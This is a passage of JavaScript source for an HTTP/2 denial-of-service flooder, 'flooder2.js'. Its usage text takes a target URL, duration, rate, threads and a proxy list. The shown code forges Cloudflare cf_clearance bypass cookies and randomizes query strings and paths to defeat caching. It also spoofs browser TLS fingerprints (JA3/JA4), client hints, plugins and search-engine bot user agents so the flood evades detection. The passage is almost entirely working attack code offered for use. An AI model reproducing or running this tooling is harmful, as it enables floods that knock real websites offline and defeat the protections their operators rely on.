        "SETTINGS_TLS_RENEG_PERMITTED": HTTP2_SETTINGS.TLS_RENEG_PERMITTED,
        "SETTINGS_ENABLE_METADATA": HTTP2_SETTINGS.ENABLE_METADATA
    };
    return settings.map(([key, value]) => [settingsMap[key] || key, value]);
};

// Update the h2Settings function to include all modern HTTP/2 settings
const h2Settings = (browser) => {
    // Base settings from HTTP2_SETTINGS_DEFAULTS
    const baseSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    
    // Browser-specific optimized settings based on latest versions
    const browserSettings = {
        chrome: {
            // Chrome 136+ settings (more aggressive and optimized)
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 262144,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            // Extended settings
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        },
        firefox: {
            // Firefox 118+ settings (more conservative)
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 128,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 131072,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            // Extended settings
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        }
    };

    // Convert the settings object to the format expected by the transformSettings function
    const settings = [];
    const selectedSettings = browserSettings[browser] || browserSettings.chrome;
    
    for (const [key, value] of Object.entries(selectedSettings)) {
        const settingName = Object.entries(HTTP2_SETTINGS).find(([name, code]) => code == key)?.[0];
        if (settingName) {
            settings.push([`SETTINGS_${settingName}`, value]);
        }
    }
    
    return Object.fromEntries(settings);
};

//=============================================================================
// CACHE AND COOKIE FUNCTIONS
//=============================================================================

// Function to generate cf_clearance bypass cookie
function generateBypassCookie() {
    const timestampString = Math.floor(Date.now() / 1000);
    return `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.2.1.1-${randstr(6)}+${randstr(80)}=`;
}

// Enhanced function to bypass Cloudflare and other CDN caches
function bypassCache(hostname, path) {
    // Return object with all bypass techniques
    const result = {
        headers: {},
        path: '',
        queryString: '',
        randomizedPath: ''
    };
    
    // Only apply if cache option is enabled
    if (!options.cache) {
        return result;
    }
    
    try {
        // 1. Create dedicated cache-busting headers
        result.headers = generateCacheHeaders();
        
        // 2. Generate random query parameters
        result.queryString = generateRandomQueryString(path);
        
        // 3. Generate random path variation
        result.randomizedPath = generateRandomPath(path);
        
        // Construct full path with query parameters
        result.fullPath = result.randomizedPath + result.queryString;
        
        return result;
    } catch (error) {
        trackCacheError(error);
        return { headers: {}, path: '', queryString: '', randomizedPath: '' };
    }
}

// Generate cache-specific headers
function generateCacheHeaders() {
    const headers = {};
    
    // Standard cache control headers
    headers["cache-control"] = randomElement([
        "no-cache, no-store, must-revalidate, max-age=0",
        "max-age=0, no-cache, no-store, must-revalidate",
        "no-store, no-cache, must-revalidate, proxy-revalidate",
        "no-cache, must-revalidate, proxy-revalidate, max-age=0"
    ]);
    
    headers["pragma"] = "no-cache";
    headers["expires"] = "0";
    
    // Add cache-busting identifiers
    headers["x-cache-buster"] = randstr(10);
    
    // Limit the number of additional headers to reduce complexity
    const additionalHeaderCount = Math.floor(Math.random() * 3); // 0-2 additional headers
    
    const possibleHeaders = [
        // CDN-specific headers
        () => {
            headers["CF-Cache-Status"] = randomElement(["BYPASS", "DYNAMIC", "EXPIRED"]);
        },
        // Country code
        () => {
            headers["CF-IPCountry"] = randomElement(["US", "GB", "DE", "FR", "JP", "AU", "CA"]);
        },
        // Ray ID
        () => {
            const rayId = randstr(16).toLowerCase();
            headers["CF-RAY"] = `${rayId}-${randomElement(["FRA", "AMS", "LHR", "CDG"])}`;
        },
        // Age header
        () => {
            headers["Age"] = "0";
        }
    ];
    
    // Add a limited number of additional headers
    const selectedIndices = new Set();
    while (selectedIndices.size < additionalHeaderCount && selectedIndices.size < possibleHeaders.length) {
        const randomIndex = Math.floor(Math.random() * possibleHeaders.length);
        if (!selectedIndices.has(randomIndex)) {
            selectedIndices.add(randomIndex);
            try {
                possibleHeaders[randomIndex]();
            } catch (e) {
                // Ignore errors in header generation
            }
        }
    }
    
    return headers;
}

// Generate random query string parameters
function generateRandomQueryString(originalPath) {
    try {
        // Timestamp for cache busting
    const timestamp = Date.now();
    let queryParams = [];
    
        // Always add timestamp parameter with random name
        const timeParamNames = ["_", "t", "ts", "time", "timestamp", "cache"];
        queryParams.push(`${randomElement(timeParamNames)}=${timestamp}`);
    
        // Add 1-3 random parameters (reduced from 2-7)
        const numParams = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numParams; i++) {
            // Simple random parameters
            const paramName = randstr(4).toLowerCase();
            const paramValue = randstr(5);
            queryParams.push(`${paramName}=${paramValue}`);
        }
        
        const queryString = queryParams.join('&');
        return originalPath.includes('?') ? '&' + queryString : '?' + queryString;
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Query string generation error: ${error.message}`);
        return originalPath.includes('?') ? '&_=' + Date.now() : '?_=' + Date.now();
    }
}

// Generate random path variations
function generateRandomPath(originalPath) {
    try {
        // Keep original path in most cases to avoid breaking functionality
        if (Math.random() < 0.8) {
            return originalPath;
        }
        
        // Extract the base path before any query string
        let basePath = originalPath.split('?')[0];
        
        // Simple path modification - just add a random suffix
        return basePath + '/' + randstr(5).toLowerCase();
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Path modification error: ${error.message}`);
        return originalPath;
    }
}

// Function to generate realistic browser plugins based on browser type
function generateFakePlugins(browser) {
    // Common PDF plugins
    const pdfPlugins = [
        {name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"]},
        {name: "PDF.js", description: "Portable Document Format", filename: "pdf.js", mimeTypes: ["application/pdf"]}
    ];
    
    // Flash plugins (legacy but still sometimes expected)
    const flashPlugins = [
        {name: "Shockwave Flash", description: "Shockwave Flash 32.0 r0", filename: "pepflashplayer.dll", mimeTypes: ["application/x-shockwave-flash"]}
    ];
    
    // Media plugins
    const mediaPlugins = [
        {name: "QuickTime Plug-in", description: "The QuickTime Plugin allows you to view a wide variety of multimedia", filename: "npqtplugin.dll", mimeTypes: ["video/quicktime", "image/x-macpaint", "image/x-quicktime"]},
        {name: "VLC Web Plugin", description: "VLC Web Plugin", filename: "npvlc.dll", mimeTypes: ["application/x-vlc-plugin", "video/x-msvideo"]},
        {name: "Windows Media Player Plug-in", description: "Windows Media Player Plugin", filename: "np-mswmp.dll", mimeTypes: ["application/x-ms-wmp", "video/x-ms-asf"]}
    ];
    
    // Browser-specific plugins
    const chromePlugins = [
        {name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl", "application/x-pnacl"]},
        {name: "Chrome Remote Desktop Viewer", description: "This plugin allows you to securely access other computers", filename: "internal-remoting-viewer", mimeTypes: ["application/vnd.chromium.remoting-viewer"]}
    ];
    
    const firefoxPlugins = [
        {name: "Widevine Content Decryption Module", description: "Enables Widevine licenses for playback of HTML audio/video content.", filename: "libwidevinecdm.so", mimeTypes: ["application/x-ppapi-widevine-cdm"]},
        {name: "OpenH264 Video Codec", description: "OpenH264 Video Codec provided by Cisco Systems, Inc.", filename: "openh264.dll", mimeTypes: ["video/h264"]}
    ];
    
    // Select plugins based on browser
    let plugins = [...pdfPlugins];
    
    // Add browser-specific plugins
    if (browser === 'chrome') {
        plugins = [...plugins, ...chromePlugins];
        
        // Chrome might have more random variation in plugins
        if (Math.random() < 0.7) {
            plugins.push(mediaPlugins[Math.floor(Math.random() * mediaPlugins.length)]);
        }
    } else {
        plugins = [...plugins, ...firefoxPlugins];
    }
    
    // Sometimes add Flash (low probability as it's deprecated)
    if (Math.random() < 0.2) {
        plugins.push(flashPlugins[0]);
    }
    
    // Format plugin info for headers
    const pluginsInfo = plugins.map(plugin => {
        return {
            name: plugin.name,
            description: plugin.description,
            mimeTypes: plugin.mimeTypes.join(',')
        };
    });
    
    return {
        count: plugins.length,
        list: pluginsInfo
    };
}

// Function to encode plugin data into custom headers
function addPluginHeaders(headers, browser) {
    const plugins = generateFakePlugins(browser);
    
    // Add custom headers with plugin info
    // We encode the data in base64 to avoid any parsing issues
    const pluginData = Buffer.from(JSON.stringify(plugins)).toString('base64');
    
    // Add plugin info via custom headers that look like they're from a browser extension
    headers["sec-ch-ua-plugins"] = `"Plugins: ${plugins.count}"`;
    
    // Add plugin headers with random ID to look more legitimate
    const randomId = Math.floor(Math.random() * 1000000);
    headers["x-plugins-data"] = `id=${randomId};count=${plugins.count}`;
    
    // Add media capability header that browsers with plugins would typically have
    if (Math.random() < 0.7) {
        headers["sec-ch-ua-full-version-list"] += `;v="plugins:${plugins.count}"`;
    }
    
    return headers;
}

const generateHeaders = (browser, parsedTarget) => {
    const versions = {
        chrome: { min: 136, max: 136 }, // Updated Chrome version to 136
        firefox: { min: 118, max: 118 }  // Updated Firefox version to 118
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    
    const fullVersions = {
        chrome: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        firefox: `${version}.0`
    };

    const brandsList = {
        chrome: [
            { brand: "Chromium", version: fullVersions.chrome.split('.')[0] },
            { brand: "Google Chrome", version: fullVersions.chrome.split('.')[0] },
            { brand: "Not:A-Brand", version: "99" }
        ],
        firefox: [
            { brand: "Firefox", version: fullVersions.firefox },
            { brand: "Gecko", version: "20100101" }
        ]
    };

    const secChUA = brandsList[browser]
        .map(b => `"${b.brand}";v="${b.version}"`)
        .join(", ");

    const secChUAFullVersionList = brandsList[browser]
        .map(b => `"${b.brand}";v="${b.version}.0.0.0"`)
        .join(", ");
        
    const platforms = {
        chrome: "Win64",
        firefox: "Win64"
    };
    const platform = platforms[browser];

    // Use exact Firefox user-agent as requested
    const userAgents = {
        chrome: `Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/138.0 Mobile/15E148 Safari/605.1.15`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0`
    };
    
    // ถ้ามีการกำหนด custom user-agent ผ่าน --ua ให้ใช้ค่าที่กำหนด
    if (options.userAgent) {
        // ใช้ custom user-agent แทนค่าเดิมทั้งหมด
        userAgents.chrome = options.userAgent;
        userAgents.firefox = options.userAgent;
    }
    // If fakebot option is enabled, use a bot user agent instead (เฉพาะกรณีที่ไม่ได้กำหนด --ua)
    else if (options.fakebot) {
        // Select a random bot user agent
        const botUserAgent = botUserAgents[Math.floor(Math.random() * botUserAgents.length)];
        
        // Override both user agents to use the bot user agent
        userAgents.chrome = botUserAgent;
        userAgents.firefox = botUserAgent;
    }

    // Create bypass cookie only if bfm option is enabled
    const bypassCookie = options.bfm ? generateBypassCookie() : '';
    
    // Create combined cookie header based on options
    let cookieHeader = '';
    
    // Add BFM cookie if enabled
    if (options.bfm && bypassCookie) {
        cookieHeader = bypassCookie;
    }
    
    // Prioritize manual cookie over fetched cookies
    if (options.manualCookie) {
        cookieHeader = cookieHeader ? `${cookieHeader}; ${options.manualCookie}` : options.manualCookie;
    }
    // Add fetched or file cookies if enabled and available
    else if ((options.cookie || options.autoCookie) && targetCookies) {
        cookieHeader = cookieHeader ? `${cookieHeader}; ${targetCookies}` : targetCookies;
    }

    // Apply cache bypassing techniques with error handling
    let cacheBypass = { headers: {}, queryString: '' };
    try {
        if (options.cache) {
            cacheBypass = bypassCache(parsedTarget.host, parsedTarget.path);
        }
    } catch (error) {
        trackCacheError(error);
    }

    // Create simplified cache headers map
    const cacheHeadersMap = {
        chrome: {
            ...(options.cache ? cacheBypass.headers : {})
        },
        firefox: {
            ...(options.cache ? cacheBypass.headers : {})
        }
    };

    const headersMap = {
        chrome: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path, // Use original path as user modified
            // Only add query string if cache is enabled and the query string exists
            ...(options.cache && cacheBypass.queryString ? { ":path": parsedTarget.path + cacheBypass.queryString } : {}),

            "sec-ch-ua": `"Firefox";v="138", "iOS";v="17"`,
            "sec-ch-ua-mobile": "?1", // Always mobile for iOS
            "sec-ch-ua-platform": `"iOS"`,
            "sec-ch-ua-platform-version": `"17.7.2"`,
            "sec-ch-ua-model": `"iPhone"`,
            "sec-ch-ua-full-version-list": `"Firefox";v="138.0.0.0", "iOS";v="17.7.2"`,
            "user-agent": userAgents[browser],
            
            // Add cookie header if we have any cookies
            ...(cookieHeader ? {"cookie": cookieHeader} : {}),

            "accept":  accept_header[Math.floor(Math.random() * accept_header.length)],
            "accept-language": [
                "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
                "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
            ][Math.floor(Math.random() * 6)],

            "accept-encoding": [
                "gzip, deflate, br", "gzip, deflate, zstd, br", 
                "gzip, br, deflate", "br, gzip, zstd"
            ][Math.floor(Math.random() * 4)],

            // Remove the vulnerable headers
            /* Removed x-forwarded-for */
            /* Removed x-real-ip */
            /* Removed x-client-ip */
            /* Removed forwarded */

            // Add alternative headers using legitimate IPs with different names to avoid detection
            ...generateAlternativeIPHeaders(),

            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)],

            ...cacheHeadersMap[browser],
                
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": "trailers",
            "priority": `"u=0, i"`,

            // Add referrer header if option is enabled
            ...(options.referrer ? {
                "referer": Math.random() < 0.5 ? 
                    "https://cloudflare.com/" : 
                    `https://${parsedTarget.host}/`
            } : {}),
        },
        firefox: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path, // Use original path as user modified
            // Only add query string if cache is enabled and the query string exists
            ...(options.cache && cacheBypass.queryString ? { ":path": parsedTarget.path + cacheBypass.queryString } : {}),
                
            "sec-ch-ua": secChUA,
            "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platforms[browser]}"`,
            "user-agent": userAgents[browser],
            
            // Add cookie header if we have any cookies
            ...(cookieHeader ? {"cookie": cookieHeader} : {}),

            "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
            "accept-language": "en-US,en;q=0.5",
            "accept-encoding": "gzip, deflate, br",

            // Remove the vulnerable headers and use alternative ones instead
            /* Removed x-forwarded-for */
            /* Removed x-real-ip */
            
            // Add alternative headers using legitimate IPs
            ...generateAlternativeIPHeaders(),

            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",

            ...cacheHeadersMap[browser],
            
            "upgrade-insecure-requests": "1",
            "priority": "u=0, i",
            "te": "trailers",

            // Add referrer header if option is enabled
            ...(options.referrer ? {
                "referer": Math.random() < 0.5 ? 
                    "https://cloudflare.com/" : 
                    `https://${parsedTarget.host}/`
            } : {}),
        }
    };

    // Add plugin headers to make the request look more authentic
    const headers = addPluginHeaders(headersMap[browser], browser);

    return headers;
};

//=============================================================================
// MAIN EXECUTION AND FLOODING FUNCTIONS
//=============================================================================

if (process.argv.length < 6) {
  console.log('Usage:');
  console.log('node flooder2.js <target> <time> <rate> <threads> <proxy-file> [options]');
  console.log('');
  console.log('Options:');
  console.log('  --bfm <true/false>         Enable/disable BFM cookie bypass (default: false)');
  console.log('  --cookie true/false          Manually fetch cookies from the target');
  console.log('  --auto-cookie true/false   Auto-load cookies from file, runs getcookie.js if no cookie file is found = auto flood without cookies');
  console.log('  --getcookie "cookie"          Manually specify cookies');
  console.log('  --cache <true/false>       Enable/disable cache bypass (default: false)');
  console.log('  --debug <true/false>       Enable/disable debug header logging (default: false)');
  console.log('  --fakebot <true/false>     Use search engine bot User-Agents (GPTBot, Googlebot, etc)');
  console.log('  --ua "user-agent"          Specify custom User-Agent string (overrides default and fakebot)');
  console.log('  --ratelimit <number>       Max requests per proxy IP (default: unlimited)');
  console.log('  --autoratelimit <true/false>  Automatically adjust rate limits based on responses (default: false)');
  console.log('  --Referrer <true/false>    Add referrer headers alternating between cloudflare.com and target (default: false)');
  console.log('  --proxy "ip:port"           Use a custom proxy IP:Port instead of a proxy file');
  console.log('  --proxy "user:pass@ip:port" Use a custom proxy with authentication');
  console.log('');
  console.log('Proxy format:');
  console.log('  ip:port                    Standard proxy format');
  console.log('  username:password@ip:port  Proxy with authentication');
  console.log('');
  console.log('Examples:');
  console.log('  node flooder2.js https://example.com 60 100 4 proxies.txt --cache true --bfm true --autoratelimit true --Referrer true');
  console.log('  node flooder2.js https://example.com 120 200 8 proxies.txt --ua "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" --cache true');
  console.log('  node flooder2.js https://example.com 30 100 4 null --proxy "1.2.3.4:8080" --cache true');
  console.log('  node flooder2.js https://example.com 30 100 4 null --proxy "user:pass@1.2.3.4:8080" --cache true');
  process.exit();
}

//=============================================================================
// TLS AND SECURITY CONFIGURATION
//=============================================================================

// Replace the existing ciphers definition with a cplist approach
const cplist = [
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256",
  "TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA"
];

// Select a random cipher suite from the list
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const ciphers = cipper;

// กำหนด TLS signature algorithms
const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
let SignalsList = sigalgs.join(':');

// กำหนด Elliptic Curves
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

// กำหนด TLS options
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

// สร้าง secure context
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
    // Add support for priority settings
    enablePriority: true
};

const secureContext = tls.createSecureContext(secureContextOptions);

// เพิ่มฟังก์ชัน shuffleObject (ฟังก์ชัน getRandomValue ถูกลบเนื่องจากไม่ได้ใช้งาน)

// เพิ่มฟังก์ชัน shuffleObject
const shuffleObject = (obj) => {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObj = {};
    keys.forEach(key => shuffledObj[key] = obj[key]);
    return shuffledObj;
};

function generateJA3Fingerprint(browser) {
    // Define the exact JA3 strings for each browser (อัพเดทล่าสุด)
    const ja3Strings = {
        // Chrome JA3 string อัพเดทล่าสุด
        chrome: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
        // Firefox JA3 string อัพเดทล่าสุด
        firefox: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0"
    };
    
    // Get the exact JA3 string for the selected browser
    const ja3String = ja3Strings[browser];
    
    // Calculate JA3 hash using the exact JA3 string
    const hash = crypto.createHash('md5');
    hash.update(ja3String);
    const ja3Hash = hash.digest('hex');
    
    // Parse the JA3 string to get components for possible use
    const [tls_version, cipherSuitesStr, extensionsStr, ecCurvesStr, ecPointFormatsStr] = ja3String.split(',');

    return {
        ja3: ja3String,
        ja3_hash: ja3Hash,
        ja3String: ja3String,
        ja3Hash: ja3Hash,
        components: {
            tls_version: tls_version,
            cipherSuites: cipherSuitesStr.split('-'),
            extensions: extensionsStr.split('-'),
            ecCurves: ecCurvesStr.split('-'),
            ecPointFormats: ecPointFormatsStr.split('-')
        }
    };
}

// New function to generate JA4 fingerprints to further evade detection
function generateJA4Fingerprint(browserType) {
    // JA4 format: (QUT)(SVCB)_(ALPN)_(SIG)_(EXTENSIONS)
    
    // Browser-specific JA4 components
    const browserProfiles = {
        chrome: {
            // Firefox on iOS
            quic: 'c13f', // h3-29 with Firefox iOS settings
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        },
        firefox: {
            // Firefox 118 on Windows
            quic: 'c13f', // h3-29 with Firefox settings
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        }
    };
    
    // Get profile based on browser type
    const profile = browserProfiles[browserType] || browserProfiles.chrome;
    
    // Create ALPN string (e.g. "00h2" for h2)
    const alpnStr = profile.alpnList[0].length.toString().padStart(2, '0') + profile.alpnList[0];
    
    // Create signature algorithms hash (first two common algorithms)
    const sigAlgCount = 2; // Use first 2 signature algorithms
    const sigAlgStr = profile.signatureAlgorithms.slice(0, sigAlgCount).join('_').substring(0, 4);
    
    // Create extensions hash (take first letter of each extension number)
    const extHash = profile.extensionsOrder.map(e => e.charAt(0)).join('').substring(0, 8);
    
    // Construct JA4 string with slight variations to avoid uniform detection
    const ja4 = `${profile.quic}_${alpnStr}_${sigAlgStr}_${extHash}`;
    
    // Hash for JA4 hash value
    const hash = crypto.createHash('md5');
    hash.update(ja4);
    const ja4Hash = hash.digest('hex').substring(0, 16); // First 16 chars
    
    return {
        ja4: ja4,
        ja4_hash: ja4Hash
    };
}

// Function to create a realistic TLS ClientHello based on browser fingerprints
function createRealisticClientHello(browser) {
    // Generate both JA3 and JA4 fingerprints for more complete evasion
    const ja3Data = generateJA3Fingerprint(browser);
    const ja4Data = generateJA4Fingerprint(browser);
    
    // Get plugin information for the browser to make connection more realistic
    const plugins = generateFakePlugins(browser);
    
    // TLS version selection to match the browser
    let tlsVersions;
    if (browser === 'chrome') {
        // Firefox on iOS uses TLS 1.2 and 1.3
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    } else {
        // Firefox similar behavior
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    }
    
    // Vary TLS parameters slightly based on variation chance
    const addCloudflareGrease = Math.random() < 0.7;
    
    // Cipher suites selection based on browser pattern
    // Chrome now uses Firefox iOS cipher ordering
    const cipherList = browser === 'chrome' ? 
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305" :
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
    
    // Normalize ALPN protocols to match browser behavior
    const alpnProtocols = ['h2', 'http/1.1'];
    
    // Include browser-specific GREASE values that Cloudflare expects to see
    // This helps avoid detection as they look for these patterns
    let ecdhCurve;
    if (addCloudflareGrease) {
        ecdhCurve = "GREASE:X25519:secp256r1:secp384r1:secp521r1";
    } else {
        ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
    }
    
    // Generate app_data string that includes information about plugins
    // This mimics how browsers include metadata in their TLS extensions
    let appData = "";
    if (plugins && plugins.count > 0) {
        const pluginNames = plugins.list.map(p => p.name.substring(0, 3)).join('');
        appData = `${browser}-${plugins.count}-${pluginNames}`;
    }
    
    // Return complete fingerprint data for TLS connection
    return {
        tlsVersions: tlsVersions,
        ciphers: cipherList,
        ecdhCurve: ecdhCurve,
        alpnProtocols: alpnProtocols,
        ja3: ja3Data,
        ja4: ja4Data,
        signatureAlgorithms: browser === 'chrome' ?
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384' :
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha256',
        plugins: plugins,
        appData: appData
    };
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

// ตรวจสอบและโหลด proxies
var proxies = [];
if (options.customProxy) {
